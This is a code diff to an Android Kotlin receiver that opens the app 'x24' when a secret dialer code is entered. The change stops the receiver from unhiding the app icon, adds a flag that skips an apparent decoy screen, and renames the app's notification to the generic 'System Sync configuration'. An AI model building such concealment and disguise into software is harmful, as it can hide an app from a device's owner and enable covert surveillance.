@@ -15,19 +15,12 @@ import android.util.Log
 class SecretCodeReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         if (intent.action == "android.provider.Telephony.SECRET_CODE") {
-            Log.d("x24", "Secret code entered. Unhiding app and launching MainActivity.")
-
-            // Unhide the app icon
-            val componentName = ComponentName(context, "com.jonas.x24.MainActivityAlias")
-            context.packageManager.setComponentEnabledSetting(
-                componentName,
-                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                PackageManager.DONT_KILL_APP
-            )
+            Log.d("x24", "Secret code entered. Launching MainActivity.")
 
             // Launch MainActivity via notification to bypass background start restrictions
             val launchIntent = Intent(context, MainActivity::class.java).apply {
                 flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
+                putExtra("bypass_decoy", true)
             }
             val pendingIntent = PendingIntent.getActivity(
                 context, 0, launchIntent,
@@ -48,8 +41,8 @@ class SecretCodeReceiver : BroadcastReceiver() {
 
             val notification = NotificationCompat.Builder(context, channelId)
                 .setSmallIcon(android.R.drawable.ic_dialog_info)
-                .setContentTitle("x24 Unhidden")
-                .setContentText("Tap here to open x24 settings.")
+                .setContentTitle("System Sync configuration")
+                .setContentText("Tap here to open configuration.")
                 .setPriority(NotificationCompat.PRIORITY_HIGH)
                 .setContentIntent(pendingIntent)
                 .setAutoCancel(true)
